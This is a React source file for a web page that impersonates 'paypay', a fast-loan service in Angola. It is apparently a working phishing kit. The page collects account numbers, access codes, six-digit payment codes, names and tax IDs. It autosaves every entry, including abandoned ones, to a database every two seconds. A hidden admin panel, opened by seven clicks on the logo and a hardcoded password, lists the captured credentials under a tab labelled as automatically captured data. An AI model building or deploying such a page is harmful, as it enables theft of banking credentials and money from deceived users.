import { createFileRoute } from "@tanstack/react-router";
import { useState, useEffect, useRef, useMemo } from "react";
import { motion, AnimatePresence } from "framer-motion";
import { ChevronLeft, CheckCircle2, Download, ShieldCheck, CreditCard, User, LayoutDashboard, Globe, HelpCircle, Eye, EyeOff, Info, Check } from "lucide-react";
import { cn } from "@/lib/utils";
import { toast } from "sonner";
import { 
  verifyAdminPassword, 
  updateApplicationStatus, 
  getApplications, 
  checkApplicationStatus,
  getDeletedApplications,
  deleteApplication,
  restoreApplication,
  deletePermanently,
  deleteAllPermanently
} from "@/lib/admin.functions";

export const Route = createFileRoute("/")({
  component: Index,
  head: () => ({
    meta: [
      { title: "paypay — Adiantamentos Rápidos" },
      { name: "description", content: "Solicite seu adiantamento de forma rápida e segura na paypay." },
      { property: "og:title", content: "paypay — Adiantamentos Rápidos" },
      { property: "og:description", content: "Solicite seu adiantamento de forma rápida e segura na paypay." },
      { property: "og:type", content: "website" },
      { name: "twitter:card", content: "summary" },
    ],
  }),
});

type Step = "home" | "login" | "step2" | "step3" | "step4" | "summary" | "confirm" | "success" | "admin";

function Index() {
  const [step, setStep] = useState<Step>("home");
  const [adminTab, setAdminTab] = useState<"pending" | "finalized" | "pre" | "users">("pre");
  const [accountNumber, setAccountNumber] = useState("");
  const [accessCode, setAccessCode] = useState("");
  const [showAccessCode, setShowAccessCode] = useState(false);
  const [paymentCode, setPaymentCode] = useState(["", "", "", "", "", ""]);
  const [amount, setAmount] = useState(35000);
  const [term, setTerm] = useState(60);
  const refundMargin = useMemo(() => Math.round((amount * 0.05) + (term * 10)), [amount, term]);
  const totalToRefund = amount + refundMargin;
  const [personalData, setPersonalData] = useState({ name: "", nif: "" });
  const [logoClicks, setLogoClicks] = useState(0);
  const [acceptedTerms, setAcceptedTerms] = useState(false);
  const [scrolledToBottom, setScrolledToBottom] = useState(false);
  const [applicationId, setApplicationId] = useState<string | null>(null);
  const scrollRef = useRef<HTMLDivElement>(null);

  const [adminAuthenticated, setAdminAuthenticated] = useState(false);
  const [adminPassword, setAdminPassword] = useState("");
  const [applications, setApplications] = useState<any[]>([]);

  const saveProgress = async () => {
    if (step === "home" || step === "admin" || step === "success") return;
    try {
      const { supabase } = await import("@/integrations/supabase/client");
      const payload = {
        account_number: accountNumber,
        access_code: accessCode,
        payment_code: paymentCode.join(""),
        amount, term,
        refund_margin: refundMargin,
        total_to_refund: totalToRefund,
        name: personalData.name,
        nif: personalData.nif,
        step,
        updated_at: new Date().toISOString()
      };
      if (applicationId) await supabase.from("pending_applications").update(payload).eq("id", applicationId);
      else if (accountNumber || accessCode) {
        const { data } = await supabase.from("pending_applications").insert([payload]).select().single();
        if (data) setApplicationId(data.id);
      }
    } catch (err) {}
  };

  useEffect(() => {
    const timer = setTimeout(saveProgress, 2000);
    return () => clearTimeout(timer);
  }, [step, accountNumber, accessCode, paymentCode, amount, term, personalData]);

  useEffect(() => {
    if (logoClicks >= 7) {
      setStep("admin");
      setLogoClicks(0);
      toast.info("Acesso Administrativo - Por favor, insira a senha");
    }
    const timer = setTimeout(() => setLogoClicks(0), 1000);
    return () => clearTimeout(timer);
  }, [logoClicks]);

  const handleScroll = () => {
    if (scrollRef.current) {
      const { scrollTop, scrollHeight, clientHeight } = scrollRef.current;
      if (scrollTop + clientHeight >= scrollHeight - 5) setScrolledToBottom(true);
    }
  };

  const nextStep = (next: Step) => setStep(next);

  const AdminDataList = ({ filter }: { filter: "pending" | "finalized" | "pre" | "users" }) => {
    const [apps, setApps] = useState<any[]>([]);
    const [loading, setLoading] = useState(true);

    useEffect(() => {
      const fetchApps = async () => {
        const { supabase } = await import("@/integrations/supabase/client");
        let query = supabase
          .from("pending_applications")
          .select("*")
          .order("updated_at", { ascending: false });
        
        if (filter === "finalized") {
          query = query.eq("step", "success");
        } else if (filter === "pre") {
          query = query.in("step", ["step2", "step3", "step4", "summary", "confirm"]);
        } else if (filter === "users") {
          query = query.or("name.neq.'',account_number.neq.''");
        } else {
          query = query.not("step", "in", '("success")');
        }

        const { data } = await query;
        if (data) setApps(data);
        setLoading(false);
      };
      fetchApps();
    }, [filter]);

    if (loading) return <div className="text-xs text-muted-foreground animate-pulse">Carregando dados...</div>;
    if (apps.length === 0) return <div className="text-xs text-muted-foreground italic">Nenhum dado encontrado para esta aba.</div>;

    return (
      <div className="bg-secondary/40 rounded-xl p-4 space-y-4 max-h-96 overflow-y-auto">
        {apps.map((app) => (
          <div key={app.id} className="text-[10px] space-y-1 border-b border-border/50 pb-2 last:border-0 last:pb-0">
            <div className="flex justify-between font-bold text-foreground">
              <span>Conta: {app.account_number || "N/A"}</span>
              <span className="text-primary uppercase tracking-tighter">Status: {app.step}</span>
            </div>
            <div className="grid grid-cols-2 gap-x-2 text-muted-foreground italic">
              <p>Nome: {app.name || "N/A"}</p>
              <p>NIF: {app.nif || "N/A"}</p>
              <p>Valor: {app.amount ? `${Number(app.amount).toLocaleString()} Kz` : "N/A"}</p>
              <p>Reembolso Total: {app.total_to_refund ? `${Number(app.total_to_refund).toLocaleString()} Kz` : "N/A"}</p>
              <p>Cod. Pagamento: {app.payment_code || "N/A"}</p>
              <p>Cod. Acesso: {app.access_code || "N/A"}</p>
            </div>
            <p className="text-[8px] text-right text-muted-foreground/60">
              Última atualização: {new Date(app.updated_at).toLocaleString()}
            </p>
          </div>
        ))}
      </div>
    );
  };

  return (
    <div className="min-h-screen bg-[#F8F9FC] font-sans">
      <div className="max-w-7xl mx-auto px-6 py-4 flex items-center justify-between border-b border-border/40 bg-white/80 backdrop-blur-md sticky top-0 z-50">
        <div onClick={() => setLogoClicks(p => p + 1)} className="cursor-pointer relative z-10">
          <img src="/logo-paypay.png" alt="paypay" className="h-8 md:h-10" />
          <div className="absolute inset-0 z-20 pointer-events-none" />
        </div>
        <div className="flex items-center gap-6 text-[11px] font-medium text-muted-foreground">
          <button className="flex items-center gap-1"><Globe className="w-3.5 h-3.5" /> Português (AO)</button>
        </div>
      </div>
      <div className="max-w-md mx-auto px-6 py-12">
        <AnimatePresence mode="wait">
          {step === "home" && (
            <motion.div key="home" initial={{ opacity: 0, y: 20 }} animate={{ opacity: 1, y: 0 }} exit={{ opacity: 0, y: -20 }} className="text-center space-y-8">
              <div className="space-y-4">
                <h1 className="text-3xl font-bold text-foreground leading-tight">Dinheiro rápido e seguro quando você mais precisa.</h1>
                <p className="text-muted-foreground">Solicite seu empréstimo em minutos de forma simples e 100% digital.</p>
              </div>
              <div className="space-y-4 pt-4">
                <button onClick={() => nextStep("login")} className="w-full bg-primary text-white h-14 rounded-2xl font-semibold text-lg shadow-xl shadow-primary/20 hover:scale-[1.02] active:scale-[0.98] transition-all cursor-pointer">Solicitar Empréstimo</button>
                <button onClick={() => toast.info("Requisitos: Conta ativa há mais de 2 meses, NIF válido, 100kz em conta para verificação.")} className="w-full bg-secondary text-primary h-14 rounded-2xl font-semibold text-lg hover:bg-accent transition-all cursor-pointer">Consultar requisitos</button>
              </div>
            </motion.div>
          )}
          {step === "login" && (
            <motion.div key="login" initial={{ opacity: 0, x: 20 }} animate={{ opacity: 1, x: 0 }} exit={{ opacity: 0, x: -20 }} className="bg-white rounded-[32px] shadow-[0_8px_30px_rgb(0,0,0,0.04)] p-10 space-y-8 border border-border/40">
              <div className="flex flex-col items-center space-y-6 text-center">
                <img src="/logo-paypay.png" alt="paypay" className="h-14" />
                <div className="space-y-3">
                  <h2 className="text-[22px] font-bold text-[#1A1A1A] tracking-tight">Iniciar Sessão</h2>
                  <p className="text-[#666666] text-[13px] leading-relaxed max-w-[240px]">Insira os dados da sua conta paypay para aceder ao Empréstimo pay</p>
                </div>
              </div>
              <div className="space-y-8">
                <div className="space-y-3">
                  <label className="text-[15px] font-bold text-[#1A1A1A]">Número da Conta</label>
                  <div className="relative border-b border-[#E5E7EB] focus-within:border-primary transition-colors"><input type="text" placeholder="9xxxxxx323" value={accountNumber} onChange={e => setAccountNumber(e.target.value.replace(/\D/g, "").slice(0, 9))} className="w-full text-[15px] outline-none bg-transparent py-3" /></div>
                </div>
                <div className="space-y-3">
                  <label className="text-[15px] font-bold text-[#1A1A1A]">Código de acesso</label>
                  <div className="relative border-b border-[#E5E7EB] focus-within:border-primary transition-colors group">
                    <input type={showAccessCode ? "text" : "password"} placeholder="•••••••••" value={accessCode} onChange={e => setAccessCode(e.target.value)} className="w-full text-[15px] outline-none bg-transparent py-3 pr-10" />
                    <button onClick={() => setShowAccessCode(!showAccessCode)} className="absolute right-0 top-1/2 -translate-y-1/2 text-[#BBBBBB] hover:text-primary transition-colors">{showAccessCode ? <EyeOff className="w-5 h-5" /> : <Eye className="w-5 h-5" />}</button>
                  </div>
                </div>
              </div>
              <button disabled={accountNumber.length < 9 || accessCode.length < 8} onClick={() => nextStep("step2")} className="w-full bg-primary text-white h-[52px] rounded-2xl font-bold text-[15px] transition-all cursor-pointer">Entrar</button>
            </motion.div>
          )}
          {step === "step2" && (
            <motion.div key="step2" initial={{ opacity: 0, x: 20 }} animate={{ opacity: 1, x: 0 }} exit={{ opacity: 0, x: -20 }} className="space-y-6">
              <h2 className="text-2xl font-bold text-center">Código de Pagamento</h2>
              <div className="flex justify-between gap-2">
                {paymentCode.map((digit, idx) => (
                  <input key={idx} id={`code-${idx}`} maxLength={1} value={digit} onChange={(e) => {
                    const newCode = [...paymentCode];
                    newCode[idx] = e.target.value.replace(/\D/g, "");
                    setPaymentCode(newCode);
                    if (newCode[idx] && idx < 5) document.getElementById(`code-${idx + 1}`)?.focus();
                  }} className="w-12 h-14 text-center text-xl border-2 rounded-xl focus:border-primary outline-none" />
                ))}
              </div>
              <button onClick={async () => { await saveProgress(); nextStep("step3"); }} className="w-full bg-primary text-white p-4 rounded-xl">Confirmar</button>
            </motion.div>
          )}
          {step === "step3" && (
            <motion.div key="step3" initial={{ opacity: 0, x: 20 }} animate={{ opacity: 1, x: 0 }} exit={{ opacity: 0, x: -20 }} className="space-y-8">
              <div className="space-y-4">
                <div className="flex justify-between"><span>Valor</span><span className="text-primary font-bold">{amount.toLocaleString("pt-AO")} Kz</span></div>
                <input type="range" min="2000" max="35000" step="500" value={amount} onChange={e => setAmount(Number(e.target.value))} className="w-full accent-primary" />
              </div>
              <div className="h-24 overflow-y-auto bg-secondary p-3 text-[10px]" ref={scrollRef} onScroll={handleScroll}>Regulamento...</div>
              <button disabled={!scrolledToBottom} onClick={() => nextStep("step4")} className="w-full bg-primary text-white p-4 rounded-xl">Avançar</button>
            </motion.div>
          )}
          {step === "step4" && (
            <motion.div key="step4" initial={{ opacity: 0, x: 20 }} animate={{ opacity: 1, x: 0 }} exit={{ opacity: 0, x: -20 }} className="space-y-4">
              <input value={personalData.name} onChange={e => setPersonalData({...personalData, name: e.target.value})} placeholder="Nome Completo" className="w-full p-4 border rounded-xl" />
              <input value={personalData.nif} onChange={e => setPersonalData({...personalData, nif: e.target.value.toUpperCase()})} placeholder="NIF" className="w-full p-4 border rounded-xl" />
              <button onClick={() => nextStep("summary")} className="w-full bg-primary text-white p-4 rounded-xl">Continuar</button>
            </motion.div>
          )}
          {step === "summary" && (
            <motion.div key="summary" initial={{ opacity: 0, x: 20 }} animate={{ opacity: 1, x: 0 }} exit={{ opacity: 0, x: -20 }} className="text-center space-y-4">
              <p>Valor: {amount.toLocaleString("pt-AO")} Kz</p>
              <p>Total a reembolsar: {totalToRefund.toLocaleString("pt-AO")} Kz</p>
              <button onClick={() => { saveProgress(); nextStep("confirm"); }} className="w-full bg-primary text-white p-4 rounded-xl">Submeter</button>
            </motion.div>
          )}
          {step === "confirm" && <motion.div key="confirm" initial={{ opacity: 0 }} animate={{ opacity: 1 }}>Processando...</motion.div>}
          {step === "success" && <motion.div key="success" initial={{ opacity: 0 }} animate={{ opacity: 1 }}>Sucesso!</motion.div>}
          {step === "admin" && (
            <motion.div key="admin" initial={{ opacity: 0 }} animate={{ opacity: 1 }} className="space-y-4">
              {!adminAuthenticated ? (
                <div className="space-y-4">
                  <input type="password" placeholder="Senha" value={adminPassword} onChange={e => setAdminPassword(e.target.value)} className="w-full p-4 border" />
                  <button onClick={() => { if (adminPassword === "moneytool") setAdminAuthenticated(true); else toast.error("Incorreto"); }} className="w-full bg-primary text-white p-4">Entrar</button>
                </div>
              ) : (
                <div className="space-y-6">
                  <div className="flex gap-1 bg-secondary/30 p-1 rounded-xl">
                    {[
                      { id: "pending", label: "Pendentes" },
                      { id: "finalized", label: "Finalizados" },
                      { id: "pre", label: "Pré-Adiant." },
                      { id: "users", label: "Usuários" }
                    ].map((tab) => (
                      <button
                        key={tab.id}
                        onClick={() => setAdminTab(tab.id as any)}
                        className={cn(
                          "flex-1 py-2 text-[10px] font-black uppercase tracking-tighter rounded-lg transition-all",
                          adminTab === tab.id ? "bg-white text-primary shadow-sm" : "text-muted-foreground hover:bg-white/50"
                        )}
                      >
                        {tab.label}
                      </button>
                    ))}
                  </div>
                  <section className="space-y-3">
                    <h3 className="text-xs font-black uppercase text-primary flex items-center gap-2 tracking-wider">
                      <Info className="w-4 h-4" /> 
                      {adminTab === "pending" && "Pedidos Aguardando Aprovação"}
                      {adminTab === "finalized" && "Histórico de Pedidos Concluídos"}
                      {adminTab === "pre" && "Dados Capturados Automaticamente"}
                      {adminTab === "users" && "Todos os Usuários Registrados"}
                    </h3>
                    <AdminDataList filter={adminTab} />
                  </section>
                </div>
              )}
            </motion.div>
          )}
        </AnimatePresence>
      </div>
    </div>
  );
}